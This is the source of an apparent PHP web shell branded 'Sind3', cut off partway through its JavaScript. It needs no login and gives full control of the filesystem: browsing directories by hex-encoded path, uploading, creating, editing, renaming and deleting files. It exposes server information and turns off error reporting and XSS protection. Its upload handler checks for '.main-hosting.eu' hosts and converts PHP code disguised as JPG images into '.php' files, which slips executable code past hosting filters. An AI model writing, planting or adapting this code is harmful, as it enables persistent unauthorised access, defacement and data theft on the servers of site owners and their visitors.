<?php
session_start();
header("X-XSS-Protection: 0");
ob_start();
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);

$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
         && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

function hex($n) {
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}

function uhex($y) {
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i+1]));
    }
    return $n;
}

if (isset($_GET["d"])) {
    $d = uhex($_GET["d"]);
    if (is_dir($d)) {
        chdir($d);
    } else {
        $d = getcwd();
    }
} else {
    $d = getcwd();
}

function setFlash($status, $msg) {
    $_SESSION['status'] = $status;
    $_SESSION['msg']    = $msg;
}

// Helper function for JSON response
function json_response($data, $status_code = 200) {
    http_response_code($status_code);
    header('Content-Type: application/json');
    echo json_encode($data);
    exit;
}

// ——— AJAX directory listing ———
if (isset($_GET['ajax']) && $_GET['ajax'] == 1) {
    ?>
    <table>
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
        <?php
        $entries  = scandir($d);
        $dirList  = [];
        $fileList = [];
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                $dirList[] = $entry;
            } else {
                $fileList[] = $entry;
            }
        }
        foreach ($dirList as $entry) {
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            echo '<tr>';
            $mtime = filemtime($path);
            $formattedTime = date("Y-m-d H:i:s", $mtime);
            echo '<td><a class="ajaxDir" title="Last modified: ' . $formattedTime . '" href="?d=' . hex($path) . '">' . htmlspecialchars($entry) . '</a></td>';
            echo '<td>-</td><td></td>';
            echo '</tr>';
        }
        foreach ($fileList as $entry) {
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            echo '<tr>';
            $mtime = filemtime($path);
            $formattedTime = date("Y-m-d H:i:s", $mtime);
            echo '<td title="Last modified: ' . $formattedTime . '">' . htmlspecialchars($entry) . '</td>';
            echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
            echo '<td>';
            echo '<a class="ajaxEdit" href="?action=edit&d=' . hex($d) . '&file=' . urlencode($entry) . '">Edit</a> | ';
            echo '<a class="ajaxRename" href="?action=rename&d=' . hex($d) . '&file=' . urlencode($entry) . '">Rename</a> | ';
            echo '<a class="ajaxDelete" href="?action=delete&d=' . hex($d) . '&file=' . urlencode($entry) . '">Delete</a>';
            echo '</td>';
            echo '</tr>';
        }
        ?>
        </tbody>
    </table>
    <?php
    exit;
}

// ——— AJAX breadcrumb ———
if (isset($_GET['ajax']) && $_GET['ajax'] === 'breadcrumb') {
    $k = preg_split("/(\\\\|\\/)/", $d);
    $breadcrumbHtml = '';
    foreach ($k as $m => $l) {
        if ($l === '' && $m === 0) {
            $breadcrumbHtml .= '<a class="ajx" href="?d=2f">/</a>';
            continue;
        }
        if ($l === '') continue;
        $breadcrumbHtml .= '<a class="ajx" href="?d=';
        for ($i = 0; $i <= $m; $i++) {
            $breadcrumbHtml .= hex($k[$i]);
            if ($i != $m) $breadcrumbHtml .= '2f';
        }
        $breadcrumbHtml .= '">'.htmlspecialchars($l).'</a>/';
    }
    echo $breadcrumbHtml;
    exit;
}

// ——— elFinder-compatible upload handler with PHP disguising as JPG ———

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_GET['action']) && $_GET['action'] == 'server_check') {
    $serverHostname = php_uname('n');
    $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
    
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'success',
        'should_disguise' => $shouldDisguise,
        'hostname' => $serverHostname
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['action']) && $_POST['action'] == 'upload') {
    $uploadDir = $d;
    
    // Check server hostname for disguise detection
    $serverHostname = php_uname('n');
    $shouldDisguise = preg_match('/\.main-hosting\.eu$/', $serverHostname);
    
    // Fixed upload handler with disguise detection and overwrite capability
    if (!isset($_FILES['upload']) && !isset($_POST['file_content'])) {
        $result = ['status' => 'failed', 'error' => 'No files uploaded', 'added' => [], 'warning' => [], 'removed' => []];
        header('Content-Type: application/json');
        echo json_encode($result);
        exit;
    }

    $result = [
        'added' => [],
        'error' => [],
        'warning' => [],
        'removed' => [], // For tracking overwritten files
        'status' => 'success'
    ];

    $uploadCount = 0;
    $uploadedNames = [];
    $overwrittenCount = 0;

    // Handle POST content uploads (for create new file)
    if (isset($_POST['file_content']) && isset($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $content = $_POST['file_content'];
        $encoding = $_POST['content_encoding'] ?? 'raw';

        // Block .jpg files on non-main-hosting servers
        if (!$shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
            $result['error'][] = "JPG files are not allowed on this server: $fileName";
        } else {
            if ($encoding === 'base64') {
                $content = base64_decode($content, true);
            }

            $fileName = preg_replace('/[\/\\\\?*:|"<>]/', '_', $fileName);
            $finalPath = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $fileName;

            // Check if file exists for overwrite tracking
            $wasOverwritten = file_exists($finalPath);
            if ($wasOverwritten) {
                $oldStat = stat($finalPath);
                $result['removed'][] = [
                    'name' => $fileName,
                    'size' => $oldStat['size'],
                    'ts' => $oldStat['mtime'],
                    'date' => date('Y-m-d H:i:s', $oldStat['mtime']),
                    'type' => 'file'
                ];
                $overwrittenCount++;
            }

            if (file_put_contents($finalPath, $content) !== false) {
                $stat = stat($finalPath);
                $result['added'][] = [
                    'name' => $fileName,
                    'size' => $stat['size'],
                    'ts' => $stat['mtime'],
                    'date' => date('Y-m-d H:i:s', $stat['mtime']),
                    'type' => 'file'
                ];
                $result['notice'] = $wasOverwritten ? 
                    "File overwritten successfully: $fileName" : 
                    "File created successfully: $fileName";
            } else {
                $result['error'][] = "Failed to create file: $fileName";
            }
        }

        // Convert to expected format for response
        $uploadedCount = count($result['added']);
        if ($uploadedCount > 0) {
            $uploadedNames = array_map(function($item) {
                return $item['name'];
            }, $result['added']);
            $result['msg'] = $result['notice'];
            $result['status'] = 'success';
        } else {
            $result['status'] = 'failed';
            $result['msg'] = !empty($result['error']) ? implode(', ', $result['error']) : 'Upload failed';
        }

        header('Content-Type: application/json');
        echo json_encode($result);
        exit;
    }

    // Handle regular file uploads
    if (isset($_FILES['upload'])) {
        // Handle both single and multiple file uploads
        if (!is_array($_FILES['upload']['name'])) {
            // Single file
            $files = [
                'name' => [$_FILES['upload']['name']],
                'tmp_name' => [$_FILES['upload']['tmp_name']],
                'error' => [$_FILES['upload']['error']],
                'size' => [$_FILES['upload']['size']],
                'type' => [$_FILES['upload']['type']]
            ];
        } else {
            // Multiple files
            $files = $_FILES['upload'];
        }

        // Process each file
        for ($i = 0; $i < count($files['name']); $i++) {
            $fileName = $files['name'][$i];
            $tmpName = $files['tmp_name'][$i];
            $error = $files['error'][$i];
            $fileSize = $files['size'][$i];
            $fileType = $files['type'][$i];

            // Check for upload errors
            if ($error !== UPLOAD_ERR_OK) {
                $result['error'][] = "Upload error for file $fileName (Error code: $error)";
                continue;
            }

            // Check if temp file exists
            if (!is_uploaded_file($tmpName)) {
                $result['error'][] = "Temp file not found for $fileName";
                continue;
            }

            // Block .jpg files on non-main-hosting servers
            if (!$shouldDisguise && preg_match('/\.jpg$/i', $fileName)) {
                $result['error'][] = "JPG files are not allowed on this server: $fileName";
                continue;
            }

            // Validate file name
            $fileName = preg_replace('/[\/\\\\?*:|"<>]/', '_', $fileName);
            $finalPath = rtrim($uploadDir, "/\\") . DIRECTORY_SEPARATOR . $fileName;

            // Check if file exists for overwrite tracking
            $wasOverwritten = file_exists($finalPath);
            if ($wasOverwritten) {
                $oldStat = stat($finalPath);
                $result['removed'][] = [
                    'name' => $fileName,
                    'size' => $oldStat['size'],
                    'ts' => $oldStat['mtime'],
                    'date' => date('Y-m-d H:i:s', $oldStat['mtime']),
                    'type' => 'file'
                ];
                $overwrittenCount++;
            }

            // Apply disguise logic for .main-hosting.eu servers ONLY
            if ($shouldDisguise && preg_match('/\.jpg$/i', $fileName) && $fileType === 'image/jpeg') {
                // Check if it's actually a PHP file disguised as JPG
                $handle = fopen($tmpName, 'rb');
                if ($handle) {
                    $preview = fread($handle, 1024);
                    fclose($handle);

                    if (strpos($preview, '<?php') === 0 || strpos($preview, '<?=') !== false) {
                        $fileName = str_replace('.jpg', '.php', $fileName);
                        $finalPath = str_replace('.jpg', '.php', $finalPath);
                        $result['warning'][] = "Disguised PHP file detected and renamed: $fileName";
                    }
                }
            }

            // Move uploaded file (overwrite if exists)
            if (move_uploaded_file($tmpName, $finalPath)) {
                $stat = stat($finalPath);
                $result['added'][] = [
                    'name' => $fileName,
                    'size' => $stat['size'],
                    'ts' => $stat['mtime'],
                    'date' => date('Y-m-d H:i:s', $stat['mtime']),
                    'type' => 'file'
                ];
                $uploadCount++;
                $uploadedNames[] = $fileName;
            } else {
                $result['error'][] = "Failed to move uploaded file: $fileName";
            }
        }

        // Set success message with overwrite info
        if ($uploadCount > 0) {
            if ($overwrittenCount > 0) {
                $result['notice'] = "Successfully uploaded $uploadCount file(s), $overwrittenCount overwritten: " . implode(', ', $uploadedNames);
            } else {
                $result['notice'] = "Successfully uploaded $uploadCount file(s): " . implode(', ', $uploadedNames);
            }
            $result['msg'] = $result['notice'];
            $result['status'] = 'success';
        } else {
            $result['status'] = 'failed';
            $result['msg'] = !empty($result['error']) ? implode(', ', $result['error']) : 'Upload failed';
        }
    }

    header('Content-Type: application/json');
    echo json_encode($result);
    exit;
}

if (isset($_GET['action'], $_GET['file']) && in_array($_GET['action'], ['delete','rename','edit']) && isset($_GET['file'])) {
    // ——— DELETE ———
    if ($_GET['action'] === 'delete') {
        $fileName = $_GET['file'];
        $filePath = realpath($d . DIRECTORY_SEPARATOR . $fileName);
        if (!$filePath || !is_file($filePath)) {
            $response = ['status'=>'failed','msg'=>'File not found or access denied'];
        } else {
            $result = unlink($filePath);
            $response = $result
                ? ['status'=>'success','msg'=>'File deleted successfully']
                : ['status'=>'failed','msg'=>'File deletion failed'];
        }
        header('Content-Type: application/json');
        echo json_encode($response);
        exit;
    }

    // ——— RENAME ———
    if ($_GET['action'] === 'rename') {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
            $oldFile = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            $newFile = $d . DIRECTORY_SEPARATOR . $_POST['new_name'];
            if ($oldFile && is_file($oldFile)) {
                $result = rename($oldFile, $newFile);
                $response = $result
                    ? ['status'=>'success','msg'=>'File renamed successfully']
                    : ['status'=>'failed','msg'=>'File renaming failed'];
            } else {
                $response = ['status'=>'failed','msg'=>'File not found'];
            }
            header('Content-Type: application/json');
            echo json_encode($response);
            exit;
        } elseif ($isAjax) {
            echo '<h2>Rename File: ' . htmlspecialchars($_GET['file']) . '</h2>';
            echo '<div class="terminal-box">';
            echo '<form class="ajaxForm" method="POST" action="?action=edit&d=' . hex($d) . '&file=' . urlencode($_GET['file']) . '">';
            echo '<input type="text" name="new_name" placeholder="New file name" required><br><br>';
            echo '<input type="submit" value="Rename"> ';
            echo '<button type="button" id="cancelAction">Cancel</button>';
            echo '</form>';
            echo '</div><hr>';
            exit;
        }
    }

    // ——— EDIT (elFinder-compatible without size limits) ———
    if ($_GET['action'] === 'edit') {
        // AJAX GET - return file content for modal editing
        if ($isAjax && $_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['get_content'])) {
            $fileName = $_GET['file'];
            $filePath = realpath($d . DIRECTORY_SEPARATOR . $fileName);
            
            if (!$filePath || !is_file($filePath)) {
                json_response(['status' => 'failed', 'error' => 'File not found'], 404);
            }
            
            if (!is_readable($filePath)) {
                json_response(['status' => 'failed', 'error' => 'File not readable'], 403);
            }
            
            // Return content without size limit
            $content = file_get_contents($filePath);
            if ($content === false) {
                json_response(['status' => 'failed', 'error' => 'Failed to read file'], 500);
            }
            
            $mimeType = 'text/plain';
            if (function_exists('mime_content_type')) {
                $detectedMime = @mime_content_type($filePath);
                if ($detectedMime) $mimeType = $detectedMime;
            }
            
            json_response([
                'status' => 'success',
                'content' => $content,
                'mime' => $mimeType,
                'name' => $fileName,
                'size' => filesize($filePath)
            ]);
        }
        
        // AJAX GET - show inline form (original method)
        elseif ($isAjax && $_SERVER['REQUEST_METHOD'] === 'GET') {
            $filePath = realpath($d . DIRECTORY_SEPARATOR . $_GET['file']);
            if ($filePath && is_file($filePath)) {
                $content = file_get_contents($filePath);
                echo '<h2>Edit File: ' . htmlspecialchars($_GET['file']) . '</h2>';
                echo '<div class="terminal-box">';
                echo '<form class="ajaxForm" method="POST" action="?action=edit&d=' . hex($d) . '&file=' . urlencode($_GET['file']) . '">';
                echo '<textarea name="content" rows="10" cols="50" required>' . htmlspecialchars($content) . '</textarea><br><br>';
                echo '<input type="submit" value="Save"> ';
                echo '<button type="button" id="cancelAction">Cancel</button>';
                echo '</form>';
                echo '</div><hr>';
            }
            exit;
        }
        
        // AJAX POST - save updated content
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
    $fileName = $_GET['file'];
    $filePath = realpath($d . DIRECTORY_SEPARATOR . $fileName);
    
    if (!$filePath || !is_file($filePath)) {
        json_response(['status' => 'failed', 'msg' => 'File not found'], 404);
    }
    
    if (!is_writable($filePath)) {
        json_response(['status' => 'failed', 'msg' => 'File not writable'], 403);
    }

    // Original behavior for input: stripslashes on raw text
    $content = stripslashes((string)$_POST['content']);

    // Create a temporary stream for streaming copy
    // php://temp stores in memory until a certain size, then spills to disk automatically.
    $src = @fopen('php://temp', 'w+b');
    if (!$src) {
        json_response(['status' => 'failed', 'msg' => 'Failed to open temp stream'], 500);
    }

    // Write incoming content to the temp stream
    $writtenToTemp = @fwrite($src, $content);
    if ($writtenToTemp === false) {
        @fclose($src);
        json_response(['status' => 'failed', 'msg' => 'Failed to buffer content to temp'], 500);
    }

    // Rewind temp stream to the beginning for copying
    @rewind($src);

    // Open destination file (no backup, overwrite)
    $dest = @fopen($filePath, 'wb');
    if (!$dest) {
        @fclose($src);
        json_response(['status' => 'failed', 'msg' => 'Failed to open file for writing'], 500);
    }

    // Stream copy from temp to destination file
    // Copies all remaining bytes from $src into $dest efficiently.
    $copied = @stream_copy_to_stream($src, $dest);

    // Close streams
    @fclose($src);
    @fclose($dest);

    if ($copied === false) {
        json_response(['status' => 'failed', 'msg' => 'Failed to write file'], 500);
    }

    // Success response with elFinder-style file info
    $stat = @stat($filePath);
    $fileInfo = [
        'name'   => $fileName,
        'hash'   => 'l1_' . base64_encode($fileName),
        'size'   => $stat ? $stat['size'] : 0,
        'mime'   => function_exists('mime_content_type') ? mime_content_type($filePath) : 'text/plain',
        'ts'     => $stat ? $stat['mtime'] : time(),
        'date'   => $stat ? date('Y-m-d H:i:s', $stat['mtime']) : date('Y-m-d H:i:s'),
        'read'   => is_readable($filePath) ? 1 : 0,
        'write'  => is_writable($filePath) ? 1 : 0,
        'locked' => 0
    ];

    json_response([
        'status'        => 'success',
        'msg'           => 'File edited successfully',
        'changed'       => [$fileInfo],
        'bytesWritten'  => $copied
    ]);
}

json_response(['status' => 'failed', 'msg' => 'Invalid request'], 400);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sind3</title>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: rgba(37, 37, 37, 0.8);
            color: #fff;
            font-family: 'Ubuntu Mono', monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 60%;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
        }
        .futer {
            width: 60%;
            margin: 50px auto;
            padding: 20px;
            background-color: #222;
            border-radius: 8px;
        }
        .breadcrumbs { margin-bottom: 15px; }
        a { color: #0f0; text-decoration: none; }
        a:hover { text-decoration: underline; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #555; padding: 8px; text-align: left; }
        th { background-color: #333; }
        input[type="text"], textarea {
            width: 100%;
            padding: 8px;
            margin: 0;
            border: 1px solid #333;
            border-radius: 4px;
            font-family: 'Ubuntu Mono', monospace;
        }
        input[type="submit"], button {
            border: 1px solid #fff;
            padding: 4px;
            background-color: #333;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
        }
        form { margin-bottom: 20px; }
        .terminal-box {
            background-color: #222;
            color: #0f0;
            padding: 15px;
            border: 1px solid #333;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        .terminal-box input[type="text"],
        .terminal-box textarea {
            background-color: #222;
            color: #0f0;
            border: 1px solid #333;
        }
        .notification {
            position: fixed;
            bottom: 20px;
            left: 20px;
            padding: 10px 20px;
            border-radius: 4px;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 14px;
            z-index: 1000;
        }
        .success { background-color: #0a0; color: #fff; }
        .failed { background-color: #a00; color: #fff; }
        .info { background-color: #4a9eff; color: #fff; }
        .warning { background-color: #ff9800; color: #fff; }
        #fileInput { display: none; }
        .custom-file-button {
            border: 1px solid #fff;
            padding: 4px;
            background-color: #333;
            color: #fff;
            cursor: pointer;
            border-radius: 4px;
            display: inline-block;
        }

        /* Modal styles */
        .edit-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        }

        .edit-modal-content {
            background: #222;
            border: 1px solid #555;
            border-radius: 8px;
            width: 90%;
            max-width: 900px;
            height: 85%;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 30px rgba(0,0,0,.5);
        }

        .edit-modal-header {
            padding: 15px;
            border-bottom: 1px solid #555;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #333;
            border-radius: 8px 8px 0 0;
        }

        .edit-modal-header h3 {
            margin: 0;
            color: #fff;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 16px;
        }

        .file-info {
            display: flex;
            gap: 15px;
            font-size: 12px;
            color: #ccc;
        }

        .edit-modal-close {
            background: none;
            border: none;
            font-size: 24px;
            color: #fff;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            border-radius: 4px;
        }

        .edit-modal-close:hover {
            background: #555;
        }

        .edit-modal-body {
            padding: 15px;
            flex: 1;
            overflow: hidden;
        }

        .edit-modal-body textarea {
            width: 100%;
            height: 100%;
            background: #111;
            color: #0f0;
            border: 1px solid #555;
            border-radius: 4px;
            padding: 12px;
            font-family: 'Ubuntu Mono', monospace;
            font-size: 14px;
            resize: none;
            line-height: 1.4;
            white-space: pre;
            word-wrap: break-word;
            overflow-wrap: break-word;
        }

        .edit-modal-footer {
            padding: 15px;
            border-top: 1px solid #555;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #333;
            border-radius: 0 0 8px 8px;
        }

        .edit-actions {
            display: flex;
            gap: 10px;
        }

        .edit-stats {
            color: #ccc;
            font-size: 12px;
            font-family: 'Ubuntu Mono', monospace;
            text-align: right;
        }

        .edit-modal-footer .btn {
            padding: 8px 16px;
            border: 1px solid #fff;
            background: #555;
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Ubuntu Mono', monospace;
        }

        .edit-modal-footer .btn:hover {
            background: #666;
        }

        .edit-modal-footer .btn.secondary {
            background: #333;
            border-color: #999;
            color: #ccc;
        }
    </style>
</head>
<body>
<div class="container">
    &thinsp;&thinsp;&thinsp;<b>SERV  :</b> <?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Server information not available"; ?><br>
    &thinsp;&thinsp;&thinsp;<b>SOFT  :</b> <?= $_SERVER['SERVER_SOFTWARE']; ?><br>
    &thinsp;&thinsp;&thinsp;<b>IP    &thinsp;&thinsp;&thinsp;&thinsp;&thinsp;:</b> <?= gethostbyname($_SERVER['HTTP_HOST']); ?><br>
    <br><b>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</b>
    <br><br>
    <form id="uploadForm" class="ajaxForm" method="POST">
        <label for="fileInput" class="custom-file-button" id="fileLabel">Choose File</label>
        <input type="file" id="fileInput" multiple required>
        <input type="submit" value="Upload">
    </form>

    <br><div id="breadcrumbContainer">
    <?php
    $k = preg_split("/(\\\\|\\/)/", $d);
    foreach ($k as $m => $l) {
        if ($l === '' && $m === 0) {
            echo '<a class="ajx" href="?d=2f">/</a>';
            continue;
        }
        if ($l === '') continue;
        echo '<a class="ajx" href="?d=';
        for ($i = 0; $i <= $m; $i++) {
            echo hex($k[$i]);
            if ($i != $m) echo '2f';
        }
        echo '">'.htmlspecialchars($l).'</a>/';
    }
    ?>
    </div><br>
    <div id="actionContainer"></div><br>
    <div id="fileListContainer">
        <?php
        $entries  = scandir($d);
        $dirList  = [];
        $fileList = [];
        foreach ($entries as $entry) {
            if ($entry === '.' || $entry === '..') continue;
            $path = $d . DIRECTORY_SEPARATOR . $entry;
            if (is_dir($path)) {
                $dirList[] = $entry;
            } else {
                $fileList[] = $entry;
            }
        }
        ?>
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
            <?php
            foreach ($dirList as $entry) {
                $path = $d . DIRECTORY_SEPARATOR . $entry;
                echo '<tr>';
                $mtime = filemtime($path);
                $formattedTime = date("Y-m-d H:i:s", $mtime);
                echo '<td><a class="ajaxDir" title="Last modified: ' . $formattedTime . '" href="?d=' . hex($path) . '">' . htmlspecialchars($entry) . '</a></td>';
                echo '<td>-</td><td></td>';
                echo '</tr>';
            }
            foreach ($fileList as $entry) {
                $path = $d . DIRECTORY_SEPARATOR . $entry;
                echo '<tr>';
                $mtime = filemtime($path);
                $formattedTime = date("Y-m-d H:i:s", $mtime);
                echo '<td title="Last modified: ' . $formattedTime . '">' . htmlspecialchars($entry) . '</td>';
                echo '<td>' . (is_file($path) ? filesize($path) . ' bytes' : '-') . '</td>';
                echo '<td>';
                echo '<a class="ajaxEdit" href="?action=edit&d=' . hex($d) . '&file=' . urlencode($entry) . '">Edit</a> | ';
                echo '<a class="ajaxRename" href="?action=rename&d=' . hex($d) . '&file=' . urlencode($entry) . '">Rename</a> | ';
                echo '<a class="ajaxDelete" href="?action=delete&d=' . hex($d) . '&file=' . urlencode($entry) . '">Delete</a>';
                echo '</td>';
                echo '</tr>';
            }
            ?>
            </tbody>
        </table>
    </div>
</div>

<div class="notification" id="notification" style="display:none;"></div>

<script>
// Enhanced notification function with custom timeout
function showNotification(status, msg, timeout = 3000) {
    var notif = document.getElementById('notification');
    if (notif) {
        notif.className = 'notification ' + status;
        notif.innerText = msg;
        notif.style.display = 'block';
        
        // Clear any existing timeout
        if (notif.timeoutId) {
            clearTimeout(notif.timeoutId);
        }
        
        // Set new timeout
        notif.timeoutId = setTimeout(function() { 
            notif.style.display = 'none'; 
        }, timeout);
    }
}

function loadBreadcrumb() {
    var d = getQueryParam("d") || "<?php echo hex($d); ?>";
    fetch('?d=' + d + '&ajax=breadcrumb', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(response => response.text())
    .then(html => {
        document.getElementById('breadcrumbContainer').innerHTML = html;
        attachBreadcrumbEvents();
    });
}

function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

function loadFileList() {
    var d = getQueryParam("d") || "<?php echo hex($d); ?>";
    fetch('?d=' + d + '&ajax=1', { headers: { 'X-Requested-With': 'XMLHttpRequest' } })
    .then(response => response.text())
    .then(html => {
        document.getElementById('fileListContainer').innerHTML = html;
        attachAjaxEvents(); // reattach events after update
        resetFileInputLabel();
    });
}

function resetFileInputLabel() {
    var label = document.getElementById('fileLabel');
    if(label) {
        label.textContent = "Choose File";
    }
}

function attachBreadcrumbEvents() {
    document.querySelectorAll('.ajx').forEach(function(link) {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            window.history.pushState(null, '', link.href);
            loadFileList();
            loadBreadcrumb();
            resetFileInputLabel();
            resetFileInput();
        });
    });
}

// Enhanced edit function with modal support - NO SIZE LIMITS
function openFileEditor(fileName, filePath) {
    // Show loading notification for large files
    showNotification('info', `Loading file: ${fileName}...`);
    
    // Get file content via AJAX
    fetch(`?action=edit&d=${getQueryParam("d") || "<?php echo hex($d); ?>"}&file=${encodeURIComponent(fileName)}&get_content=1`, {
        headers: { 'X-Requested-With': 'XMLHttpRequest' }
    })
    .then(response => response.json())
    .then(data => {
        if (data.status !== 'success') {
            showNotification('failed', data.error || 'Failed to load file');
            return;
        }
        
        // Show file size info for large files
        const sizeMB = (data.size / (1024 * 1024)).toFixed(2);
        if (data.size > 1024 * 1024) { // > 1MB
            showNotification('success', `Loaded large file: ${sizeMB} MB`);
        }
        
        showEditModal(fileName, data.content, data.mime, data.size);
    })
    .catch(error => {
        showNotification('failed', 'Error loading file: ' + error.message);
    });
}

// Enhanced edit modal without size restrictions
function showEditModal(fileName, content, mimeType, fileSize) {
    // Remove existing modal if any
    const existingModal = document.querySelector('.edit-modal');
    if (existingModal) {
        existingModal.remove();
    }
    
    const sizeMB = (fileSize / (1024 * 1024)).toFixed(2);
    const sizeDisplay = fileSize > 1024 * 1024 ? `${sizeMB} MB` : formatFileSize(fileSize);
    
    // Create modal HTML
    const modal = document.createElement('div');
    modal.className = 'edit-modal';
    modal.innerHTML = `
        <div class="edit-modal-content">
            <div class="edit-modal-header">
                <h3>Edit File: ${fileName}</h3>
                <div class="file-info">
                    <span>Type: ${mimeType}</span>
                    <span>Size: ${sizeDisplay}</span>
                    ${fileSize > 5 * 1024 * 1024 ? '<span style="color: #ffcc66;">⚠ Large File</span>' : ''}
                </div>
                <button class="edit-modal-close" onclick="closeEditModal()">&times;</button>
            </div>
            <div class="edit-modal-body">
                <textarea id="editFileContent" rows="20" cols="80">${content.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</textarea>
            </div>
            <div class="edit-modal-footer">
                <div class="edit-actions">
                    <button class="btn" onclick="saveFileContent('${fileName}')">Save File</button>
                    <button class="btn secondary" onclick="closeEditModal()">Cancel</button>
                    ${fileSize > 1024 * 1024 ? '<button class="btn secondary" onclick="saveWithConfirm(\'' + fileName + '\')">Save Large File</button>' : ''}
                </div>
                <div class="edit-stats">
                    <span id="editStats">Lines: ${content.split('\n').length}, Chars: ${content.length}</span>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Focus on textarea
    const textarea = document.getElementById('editFileContent');
    textarea.focus();
    
    // Update stats on content change
    textarea.addEventListener('input', function() {
        const stats = document.getElementById('editStats');
        const lines = this.value.split('\n').length;
        const chars = this.value.length;
        const bytes = new Blob([this.value]).size;
        const currentSizeMB = (bytes / (1024 * 1024)).toFixed(2);
        
        if (bytes > 1024 * 1024) {
            stats.textContent = `Lines: ${lines}, Chars: ${chars}, Size: ${currentSizeMB} MB`;
        } else {
            stats.textContent = `Lines: ${lines}, Chars: ${chars}, Size: ${formatFileSize(bytes)}`;
        }
    });
    
    // Add keyboard shortcuts
    textarea.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 's') {
            e.preventDefault();
            saveFileContent(fileName);
        }
        if (e.key === 'Escape') {
            e.preventDefault();
            closeEditModal();
        }
        // Tab key support
        if (e.key === 'Tab') {
            e.preventDefault();
            const start = this.selectionStart;
            const end = this.selectionEnd;
            this.value = this.value.substring(0, start) + '\t' + this.value.substring(end);
            this.selectionStart = this.selectionEnd = start + 1;
        }
    });
    
    // Warning for very large files
    if (fileSize > 10 * 1024 * 1024) { // > 10MB
        setTimeout(() => {
            showNotification('warning', `Editing large file (${sizeMB} MB). Save operations may take longer.`, 5000);
        }, 1000);
    }
}

// Save file content function - handles any size
async function saveFileContent(fileName) {
    const content = document.getElementById('editFileContent').value;
    const currentDir = getQueryParam("d") || "<?php echo hex($d); ?>";
    
    // Show saving notification for large content
    const contentSize = new Blob([content]).size;
    const sizeMB = (contentSize / (1024 * 1024)).toFixed(2);
    
    if (contentSize > 1024 * 1024) {
        showNotification('info', `Saving large file (${sizeMB} MB)...`, 10000);
    }
    
    try {
        const formData = new FormData();
        formData.append('content', content);
        
        const response = await fetch(`?action=edit&d=${currentDir}&file=${encodeURIComponent(fileName)}`, {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        });
        
        const result = await response.json();
        
        if (result.status === 'success') {
            const savedSizeMB = (result.bytesWritten / (1024 * 1024)).toFixed(2);
            const sizeInfo = result.bytesWritten > 1024 * 1024 ? 
                `${savedSizeMB} MB written` : 
                `${result.bytesWritten} bytes written`;
            
            showNotification('success', `File "${fileName}" saved successfully (${sizeInfo})`);
            closeEditModal();
            
            // Refresh file list
            if (typeof loadFileList === 'function') {
                loadFileList();
            }
        } else {
            showNotification('failed', result.msg || 'Failed to save file');
        }
        
    } catch (error) {
        showNotification('failed', 'Error saving file: ' + error.message);
    }
}

// Save with confirmation for large files
function saveWithConfirm(fileName) {
    const content = document.getElementById('editFileContent').value;
    const contentSize = new Blob([content]).size;
    const sizeMB = (contentSize / (1024 * 1024)).toFixed(2);
    
    if (confirm(`Are you sure you want to save this large file (${sizeMB} MB)? This operation may take some time.`)) {
        saveFileContent(fileName);
    }
}

// Close edit modal
function closeEditModal() {
    const modal = document.querySelector('.edit-modal');
    if (modal) {
        modal.remove();
    }
}

// Format file size helper
function formatFileSize(bytes) {
